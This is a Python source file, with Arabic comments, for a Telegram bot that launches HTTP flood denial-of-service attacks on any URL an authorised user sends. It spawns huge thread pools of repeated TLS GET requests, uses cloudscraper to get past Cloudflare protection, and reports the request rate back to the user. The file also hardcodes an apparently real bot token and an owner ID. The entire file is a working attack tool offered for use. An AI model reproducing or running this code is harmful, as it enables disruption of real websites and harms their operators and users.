
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import cloudscraper
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3
import time
import socket
import ssl

# تعطيل التحقق من صحة شهادة SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

scraper = cloudscraper.create_scraper()  # إنشاء كائن scraper لتجاوز Cloudflare
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# قائمة المالكين والمستخدمين
Owner = ['6358035274']
NormalUsers = []

# استبدل 'YOUR_TOKEN_HERE' بالرمز الخاص بك من BotFather
bot = telebot.TeleBot('7287602125:AAH9buxYlFiOo2kAUnkicgmRSo4NSx8lV6w')

# متغيرات التحكم في الهجوم
attack_in_progress = False
attack_lock = threading.Lock()

def bypass_attack(host, port=443):
    global attack_in_progress
    try:
        while attack_in_progress:
            context = ssl.create_default_context()
            with socket.create_connection((host, port)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    ssock.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {headers['User-Agent']}\r\n\r\n".encode())
                    print(f"تم إرسال الطلب إلى: {host}:{port}")
    except Exception as e:
        print("حدث خطأ:", e)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "مرحباً! أرسل لي رابط الهدف للبدء في الهجوم.")

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    global attack_in_progress
    with attack_lock:
        attack_in_progress = False
    bot.reply_to(message, "تم إيقاف الهجوم.")
    bot.send_message(message.chat.id, "الهجوم تم إيقافه بنجاح.")

@bot.message_handler(commands=['attack'])
def start_attack(message):
    global attack_in_progress
    if str(message.chat.id) in Owner or str(message.chat.id) in NormalUsers:
        url = message.text.split()[1]  # افتراض أن الرابط يأتي بعد الأمر مباشرة
        num_repeats = int(message.text.split()[2]) if len(message.text.split()) > 2 else 1
        host = url.split("//")[-1].split("/")[0]  # استخراج اسم المضيف من الرابط

        start_time = time.time()  # بدء المؤقت

        # زيادة عدد الخيوط
        max_workers = 500000  # يمكنك تعديل هذا الرقم بناءً على قدرة جهازك والهدف
        num_requests = 100000  # يمكنك أيضاً تعديل عدد الطلبات

        with attack_lock:
            attack_in_progress = True

        bot.send_message(message.chat.id, f"الهجوم بدأ على {url} بعدد مرات تكرار {num_repeats}.")

        for _ in range(num_repeats):
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                for _ in range(num_requests):
                    executor.submit(bypass_attack, host)

        end_time = time.time()  # انتهاء المؤقت

        # حساب الزمن المستغرق
        elapsed_time = end_time - start_time

        # حساب نسبة الإرسال بالطلبات في الثانية
        requests_per_second = num_requests * num_repeats / elapsed_time
        bot.reply_to(message, f"نسبة إرسال الطلبات: {requests_per_second:.2f} طلب/ثانية")

        # استخدام session
        response = scraper.get(url, headers=headers)  # استخدام scraper بدلاً من requests
        bot.reply_to(message, response.text)
    else:
        bot.reply_to(message, "عذراً، أنت غير مصرح لك باستخدام هذه الأداة.")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    bot.reply_to(message, "استخدم /attack <الرابط> <عدد مرات التكرار> لبدء الهجوم أو /stop لإيقاف الهجوم.")

bot.polling()
